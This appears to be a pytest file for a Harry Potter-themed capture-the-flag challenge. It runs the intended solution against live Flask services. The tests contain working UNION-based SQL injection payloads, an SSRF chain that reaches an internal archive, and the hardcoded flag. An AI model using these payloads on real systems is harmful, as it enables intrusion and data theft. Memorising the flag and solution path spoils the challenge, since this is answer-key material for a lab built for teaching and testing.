"""
End-to-end test of the *intended solution path*, run against two real,
separately-running Flask processes (not test clients, not mocks):

  1. SQLi recon against /api/accio extracts the internal hostname/port
     (map_services) and the archive phrase (map_notes).
  2. SSRF via /api/owl uses that recon to reach the internal service's
     /archive/room-of-requirement and retrieve the flag.

Resolving the hostname `map-internal` requires DNS. Inside Docker, the
real `castle-net` network provides that for free. Outside Docker, this
test does NOT touch /etc/hosts and needs no elevated privileges: the
web subprocess is started with a small bootstrap that patches
`socket.getaddrinfo` *inside that one process only*, mapping the
single hostname `map-internal` to 127.0.0.1. Nothing is written to any
system file, and nothing persists once the subprocess exits.
"""

import os
import re
import signal
import socket
import subprocess
import sys
import time

import pytest
import requests

ROOT = os.path.join(os.path.dirname(__file__), "..")
BACKEND_DIR = os.path.join(ROOT, "backend")
INTERNAL_DIR = os.path.join(ROOT, "map-internal")

FLAG = "kernel{7h3_m4p_r3m3mb3rs_wh4t_y0u_h1d3}"

_HOSTNAME_SHIM = """
import socket as _socket
_real_getaddrinfo = _socket.getaddrinfo
_FAKE_HOSTS = {"map-internal": "127.0.0.1"}
def _patched_getaddrinfo(host, *args, **kwargs):
    return _real_getaddrinfo(_FAKE_HOSTS.get(host, host), *args, **kwargs)
_socket.getaddrinfo = _patched_getaddrinfo
"""


def _port_open(port, host="127.0.0.1"):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        return s.connect_ex((host, port)) == 0


def _wait_for_port(port, timeout=10):
    deadline = time.time() + timeout
    while time.time() < deadline:
        if _port_open(port):
            return True
        time.sleep(0.15)
    return False


@pytest.fixture(scope="module")
def live_stack(tmp_path_factory):
    tmp_dir = tmp_path_factory.mktemp("castle")
    db_path = str(tmp_dir / "castle.db")

    env = os.environ.copy()
    env["PYTHONUNBUFFERED"] = "1"

    seed_proc = subprocess.run(
        [sys.executable, "-c",
         f"import sys; sys.path.insert(0,'{BACKEND_DIR}'); import seed; "
         f"seed.DB_PATH={db_path!r}; seed.seed()"],
        capture_output=True, text=True,
    )
    assert seed_proc.returncode == 0, seed_proc.stderr

    internal_proc = subprocess.Popen(
        [sys.executable, "app.py"], cwd=INTERNAL_DIR, env=env,
    )
    web_proc = subprocess.Popen(
        [sys.executable, "-c",
         _HOSTNAME_SHIM +
         f"import sys; sys.path.insert(0,'{BACKEND_DIR}'); "
         f"import app; app.DB_PATH={db_path!r}; "
         f"app.app.run(host='0.0.0.0', port=5000)"],
        cwd=BACKEND_DIR, env=env,
    )

    try:
        assert _wait_for_port(5001, timeout=10), "map-internal did not start on :5001"
        assert _wait_for_port(5000, timeout=10), "web did not start on :5000"
        yield {"web": "http://127.0.0.1:5000"}
    finally:
        for proc in (web_proc, internal_proc):
            proc.send_signal(signal.SIGTERM)
        for proc in (web_proc, internal_proc):
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()


def test_frontend_is_served_by_the_backend(live_stack):
    dist_index = os.path.join(BACKEND_DIR, "dist", "index.html")
    if not os.path.exists(dist_index):
        pytest.skip(
            "backend/dist/index.html not found -- build the frontend first: "
            "cd marauders-map && npm ci && npm run build && cp -r dist ../backend/dist"
        )
    r = requests.get(live_stack["web"] + "/", timeout=5)
    assert r.status_code == 200
    assert "Marauder" in r.text


def test_full_exploit_chain_recovers_the_flag(live_stack):
    web = live_stack["web"]

    # Step 1: SQLi recon -- pull hostname/port from map_services.
    r = requests.post(
        f"{web}/api/accio",
        json={"query": "zzzzzzzz' UNION SELECT hostname, CAST(port AS TEXT) FROM map_services -- "},
        timeout=5,
    )
    data = r.json()
    assert data["success"] is True
    hostname = next(x["name"] for x in data["results"] if x["name"] != "")
    port = next(x["note"] for x in data["results"])
    assert hostname == "map-internal"
    assert port == "5001"

    # Step 2: SQLi recon -- pull the archive phrase from map_notes.
    r = requests.post(
        f"{web}/api/accio",
        json={"query": "zzzzzzzz' UNION SELECT 'note', content FROM map_notes -- "},
        timeout=5,
    )
    data = r.json()
    note_text = " ".join(x["note"] for x in data["results"])
    phrase_match = re.search(r"say,? to the wall:\s*([a-z ]+)\.", note_text.lower())
    assert phrase_match, f"could not find the archive phrase in: {note_text!r}"
    phrase = phrase_match.group(1).strip()
    assert phrase == "mischief managed"

    # Step 3: SSRF -- use the recon'd hostname/port/phrase against the
    # public POST /api/owl endpoint to reach the internal archive.
    internal_url = f"http://{hostname}:{port}/archive/room-of-requirement?phrase={phrase}"
    r = requests.post(f"{web}/api/owl", json={"address": internal_url}, timeout=5)
    data = r.json()
    assert data["success"] is True, data
    assert FLAG in data["body"]


def test_ssrf_blocklist_still_blocks_loopback_even_with_live_stack(live_stack):
    web = live_stack["web"]
    r = requests.post(
        f"{web}/api/owl",
        json={"address": "http://127.0.0.1:5001/archive"},
        timeout=5,
    )
    assert r.status_code == 403
